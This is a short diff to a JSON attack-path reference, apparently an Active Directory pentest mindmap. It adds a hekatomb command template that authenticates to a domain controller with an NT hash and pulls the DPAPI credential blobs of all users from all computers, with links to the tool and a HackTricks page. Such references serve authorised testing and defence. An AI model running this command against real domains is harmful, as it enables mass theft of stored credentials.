@@ -3472,7 +3472,15 @@
               }
             }
           ],
-          "userCommands": [],
+          "userCommands": [
+            {
+              "command": "hekatomb -hashes :<hash_nt> <domain>/<user>@<dc_ip> -debug ",
+              "info": {
+                "text": "Hekatomb is a python script that connects to LDAP directory to retrieve all computers and users informations. Then it will download all DPAPI blob of all users from all computers.",
+                "references": ["https://github.com/ProcessusT/HEKATOMB", "https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html"]
+              }
+            }
+          ],
           "next": [
             "authenticated",
             "lat-move"
